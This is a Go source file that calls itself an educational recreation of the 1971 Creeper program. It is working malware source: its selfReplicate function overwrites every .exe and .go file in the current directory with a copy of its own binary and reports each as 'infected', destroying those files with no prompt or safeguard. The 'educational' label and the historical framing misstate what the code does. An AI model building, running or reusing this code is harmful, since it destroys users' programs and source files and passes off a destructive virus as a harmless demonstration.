// Creeper (1971) - Educational self-replicating program
// Bob Thomas / BBN - First virus concept
//
// Build: go build creeper.go
// This version copies its own source OR binary to sibling files

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func selfReplicate() int {
	self, err := os.Executable()
	if err != nil {
		return 0
	}
	selfData, err := os.ReadFile(self)
	if err != nil {
		return 0
	}

	dir, _ := os.Getwd()
	entries, _ := os.ReadDir(dir)
	count := 0

	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if filepath.Base(self) == name {
			continue
		}
		if strings.HasSuffix(name, ".exe") || strings.HasSuffix(name, ".go") {
			target := filepath.Join(dir, name)
			_ = os.WriteFile(target, selfData, 0755)
			fmt.Printf("[creep] infected: %s\n", name)
			count++
		}
	}

	// Memory duplicator simulation
	_ = make([]byte, 4096*2)

	return count
}

func main() {
	fmt.Println("I'M THE CREEPER: CATCH ME IF YOU CAN.")
	n := selfReplicate()
	fmt.Printf("[creep] infections: %d file(s)\n", n)
	fmt.Println("[creep] use antivirus to remove me")
}
